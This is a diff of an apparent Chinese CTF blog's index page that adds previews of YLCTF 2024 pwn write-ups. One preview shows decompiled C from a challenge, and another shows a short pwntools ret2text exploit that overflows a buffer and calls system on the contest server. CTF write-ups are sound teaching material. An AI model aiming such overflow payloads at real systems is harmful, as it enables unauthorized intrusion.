@@ -133,7 +133,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/10/12/YLCTF-msgbot-protobuf/" >『YLCTF 源鲁杯 2024』 msg_bot</a>
+			<a href="/2024/10/12/YLCTF-msgbot-protobuf/" title="做了一天，我太菜了">『YLCTF 源鲁杯 2024』 msg_bot</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -147,7 +147,9 @@
   <div class="row">
 	
 	
-		比赛结束后开放
+		<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_1389</span><span class="params">(<span class="type">double</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  isnan(a1);</span><br><span class="line">  v2 = rand();</span><br><span class="line">  result = mmap((<span class="type">void</span> *)(v2 % <span class="number">0x7FFFFFFF</span>), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  dest = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>申请了一块mmap地址。</p>
 	
 	</div>
   <a type="button" href="/2024/10/12/YLCTF-msgbot-protobuf/#more" class="btn btn-default more">阅读此文</a>
@@ -160,7 +162,7 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/10/12/2024YLCTF-1/" title="ROUND1">『YLCTF 源鲁杯 2024』 PWN WP</a>
+			<a href="/2024/10/12/2024YLCTF-1/" title="ROUND1">『YLCTF 源鲁杯 2024』 PWN-1 WP</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
@@ -174,7 +176,8 @@
   <div class="row">
 	
 	
-		比赛结束后开放
+		<h2 id="0x00-giaopwn"><a href="#0x00-giaopwn" class="headerlink" title="0x00 giaopwn"></a>0x00 giaopwn</h2><p>ret2text，没什么好讲的。有个cat flag的字符串，直接用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41537</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400743</span></span><br><span class="line">flag = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x4006D2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(flag)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 	
 	</div>
   <a type="button" href="/2024/10/12/2024YLCTF-1/#more" class="btn btn-default more">阅读此文</a>
@@ -487,39 +490,39 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/protobuf/">protobuf<span>1</span></a></li>
-		
-			<li><a href="/tags/WP/">WP<span>14</span></a></li>
-		
-			<li><a href="/tags/图灵完备，计组/">图灵完备，计组<span>1</span></a></li>
-		
-			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
-		
 			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
-		
-			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
-		
-			<li><a href="/tags/docker/">docker<span>1</span></a></li>
-		
-			<li><a href="/tags/PWN，protobuf/">PWN，protobuf<span>1</span></a></li>
-		
-			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>21</span></a></li>
-		
-			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
 		
 			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
 		
-			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
-		
 			<li><a href="/tags/heap/">heap<span>6</span></a></li>
 		
-			<li><a href="/tags/diary/">diary<span>14</span></a></li>
+			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
+		
+			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
+		
+			<li><a href="/tags/PWN/">PWN<span>24</span></a></li>
+		
+			<li><a href="/tags/WP/">WP<span>14</span></a></li>
 		
 			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
 		
-			<li><a href="/tags/PWN/">PWN<span>24</span></a></li>
+			<li><a href="/tags/图灵完备，计组/">图灵完备，计组<span>1</span></a></li>
+		
+			<li><a href="/tags/PWN，protobuf/">PWN，protobuf<span>1</span></a></li>
+		
+			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>21</span></a></li>
+		
+			<li><a href="/tags/docker/">docker<span>1</span></a></li>
+		
+			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
+		
+			<li><a href="/tags/protobuf/">protobuf<span>1</span></a></li>
+		
+			<li><a href="/tags/magic-gadget/">magic_gadget<span>1</span></a></li>
+		
+			<li><a href="/tags/diary/">diary<span>14</span></a></li>
 		
 		 
 		</ul>
@@ -533,11 +536,11 @@
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2024/10/12/YLCTF-msgbot-protobuf/" ><i class="fa fa-file-o"></i>『YLCTF 源鲁杯 2024』 msg_bot</a>
+        <a href="/2024/10/12/YLCTF-msgbot-protobuf/"  title="做了一天，我太菜了" ><i class="fa fa-file-o"></i>『YLCTF 源鲁杯 2024』 msg_bot</a>
       </li>
     
       <li>
-        <a href="/2024/10/12/2024YLCTF-1/"  title="ROUND1" ><i class="fa fa-file-o"></i>『YLCTF 源鲁杯 2024』 PWN WP</a>
+        <a href="/2024/10/12/2024YLCTF-1/"  title="ROUND1" ><i class="fa fa-file-o"></i>『YLCTF 源鲁杯 2024』 PWN-1 WP</a>
       </li>
     
       <li>
